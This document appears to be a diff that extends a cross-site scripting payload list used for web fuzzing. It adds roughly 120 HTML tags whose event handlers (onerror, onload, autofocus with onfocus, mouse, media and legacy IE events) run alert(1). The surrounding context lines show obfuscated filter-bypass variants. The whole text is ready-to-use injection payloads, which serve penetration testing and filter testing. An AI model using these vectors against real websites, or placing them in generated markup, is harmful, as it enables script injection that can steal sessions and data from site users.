@@ -12,3 +12,130 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/on
 <img src=x onload=&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)>
 1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
 <iMG src=x onerror=\u0061lert(1)>
+<img src="valid.jpg" onabort="alert(1)">
+<div onactivate="alert(1)">Click to activate</div>
+<div onbeforeactivate="alert(1)">Before activate</div>
+<div onbeforedeactivate="alert(1)">Before deactivate</div>
+<input onbeforeeditfocus="alert(1)">
+<body onbeforeprint="alert(1)">
+<input onblur="alert(1)" autofocus>Click then tab away</input>
+<video oncanplay="alert(1)" src="valid.mp4"></video>
+<video oncanplaythrough="alert(1)" src="valid.mp4"></video>
+<input onchange="alert(1)">Change me</input>
+<div onclick="alert(1)">Click me</div>
+<div oncontextmenu="alert(1)">Right-click me</div>
+<div oncopy="alert(1)">Copy this text</div>
+<track oncuechange="alert(1)" src="subtitles.vtt">
+<div oncut="alert(1)" contenteditable>Cut this</div>
+<div ondblclick="alert(1)">Double-click me</div>
+<div ondeactivate="alert(1)">Deactivate</div>
+<div draggable="true" ondrag="alert(1)">Drag me</div>
+<div draggable="true" ondragend="alert(1)">Drag and drop</div>
+<div ondragenter="alert(1)">Drop target</div>
+<div ondragleave="alert(1)">Drag leave</div>
+<div ondragover="alert(1)">Drag over</div>
+<div draggable="true" ondragstart="alert(1)">Start drag</div>
+<div ondrop="alert(1)">Drop here</div>
+<video ondurationchange="alert(1)" src="valid.mp4"></video>
+<video onemptied="alert(1)" src="valid.mp4"></video>
+<video onended="alert(1)" src="valid.mp4" autoplay></video>
+<img src="x" onerror="alert(1)">
+<input onfocus="alert(1)" autofocus>
+<input onfocusin="alert(1)" autofocus>
+<input onfocusout="alert(1)" autofocus>Focus then blur</input>
+<body onhashchange="alert(1)">
+<input oninput="alert(1)">Type here</input>
+<input required oninvalid="alert(1)">Submit invalid</input>
+<input onkeydown="alert(1)">Press key</input>
+<input onkeypress="alert(1)">Press key</input>
+<input onkeyup="alert(1)">Release key</input>
+<img src="valid.jpg" onload="alert(1)">
+<video onloadeddata="alert(1)" src="valid.mp4"></video>
+<video onloadedmetadata="alert(1)" src="valid.mp4"></video>
+<video onloadstart="alert(1)" src="valid.mp4"></video>
+<div onmousedown="alert(1)">Mouse down</div>
+<div onmouseenter="alert(1)">Enter mouse</div>
+<div onmouseleave="alert(1)">Leave mouse</div>
+<div onmousemove="alert(1)">Move mouse</div>
+<div onmouseout="alert(1)">Mouse out</div>
+<div onmouseover="alert(1)">Hover me</div>
+<div onmouseup="alert(1)">Mouse up</div>
+<div onmousewheel="alert(1)">Wheel mouse</div>
+<body onoffline="alert(1)">
+<body ononline="alert(1)">
+<body onpagehide="alert(1)">
+<body onpageshow="alert(1)">
+<div contenteditable onpaste="alert(1)">Paste here</div>
+<video onpause="alert(1)" src="valid.mp4" autoplay></video>
+<video onplay="alert(1)" src="valid.mp4"></video>
+<video onplaying="alert(1)" src="valid.mp4" autoplay></video>
+<body onpopstate="alert(1)">
+<video onprogress="alert(1)" src="valid.mp4"></video>
+<video onratechange="alert(1)" src="valid.mp4"></video>
+<script onreadystatechange="alert(1)"></script>
+<div contenteditable onredo="alert(1)">Redo action</div>
+<body onresize="alert(1)">
+<div style="overflow:scroll;height:100px" onscroll="alert(1)">Scroll me<br><br><br><br></div>
+<input type="search" onsearch="alert(1)">Search</input>
+<video onseeked="alert(1)" src="valid.mp4"></video>
+<video onseeking="alert(1)" src="valid.mp4"></video>
+<input onselect="alert(1)">Select text</input>
+<body onselectionchange="alert(1)">Select text</body>
+<div onselectstart="alert(1)">Start select</div>
+<video onstalled="alert(1)" src="invalid.mp4"></video>
+<body onstorage="alert(1)">
+<form onsubmit="alert(1)"><input type="submit"></form>
+<video onsuspend="alert(1)" src="valid.mp4"></video>
+<video ontimeupdate="alert(1)" src="valid.mp4" autoplay></video>
+<div contenteditable onundo="alert(1)">Undo action</div>
+<body onunload="alert(1)">
+<video onvolumechange="alert(1)" src="valid.mp4"></video>
+<video onwaiting="alert(1)" src="valid.mp4"></video>
+<div contenteditable onbeforecut="alert(1)">Before cut</div>
+<div contenteditable onbeforepaste="alert(1)">Before paste</div>
+<div onbeforeupdate="alert(1)">Before update</div>
+<div oncontrolselect="alert(1)">Control select</div>
+<div onfilterchange="alert(1)">Filter change</div>
+<form onformchange="alert(1)"><input></form>
+<form onforminput="alert(1)"><input></form>
+<div onpropertychange="alert(1)">Property change</div>
+<track onaddtrack="alert(1)" src="subtitles.vtt">
+<details onenter="alert(1)"><summary>Enter</summary></details>
+<marquee onstart="alert(1)">Marquee start</marquee>
+<marquee onstop="alert(1)">Marquee stop</marquee>
+<video ontimeerror="alert(1)" src="invalid.mp4"></video>
+<track ontrack="alert(1)" src="subtitles.vtt">
+<body onafterprint="alert(1)">
+<div onafterupdate="alert(1)">After update</div>
+<div onerrorupdate="alert(1)">Error update</div>
+<embed src="flash.swf" FSCommand="alert(1)">
+<div onbeforecopy="alert(1)">Before copy</div>
+<body onbeforeunload="alert(1)">
+<table oncellchange="alert(1)"><td>Cell change</td></table>
+<div ondataavailable="alert(1)">Data available</div>
+<div ondatasetchanged="alert(1)">Dataset changed</div>
+<div ondatasetcomplete="alert(1)">Dataset complete</div>
+<marquee onfinish="alert(1)">Marquee finish</marquee>
+<body onhelp="alert(1)">
+<div onlayoutcomplete="alert(1)">Layout complete</div>
+<div onlosecapture="alert(1)">Lose capture</div>
+<video onmediaerror="alert(1)" src="invalid.mp4"></video>
+<div onmove="alert(1)">Move</div>
+<div onmoveend="alert(1)">Move end</div>
+<div onmovestart="alert(1)">Move start</div>
+<video onoutofsync="alert(1)" src="valid.mp4"></video>
+<script onreadyStateChange="alert(1)"></script>
+<form onreset="alert(1)"><input type="reset"></form>
+<div onresizeend="alert(1)">Resize end</div>
+<div onresizestart="alert(1)">Resize start</div>
+<table onrowenter="alert(1)"><tr><td>Row enter</td></tr></table>
+<table onrowexit="alert(1)"><tr><td>Row exit</td></tr></table>
+<table onrowsdelete="alert(1)">Rows delete</table>
+<table onrowsinserted="alert(1)">Rows inserted</table>
+<video onsyncrestored="alert(1)" src="valid.mp4"></video>
+<div style="animation: x 1s" onwebkitanimationend="alert(1)">Animation end</div>
+<div style="animation: x 1s infinite" onwebkitanimationiteration="alert(1)">Iteration</div>
+<div style="animation: x 1s" onwebkitanimationstart="alert(1)">Animation start</div>
+<div style="transition: x 1s" onwebkittransitionend="alert(1)">Transition end</div>
+<div style="scroll-snap-type: x" onscrollsnapchanging="alert(1)">Scroll snap</div>
+
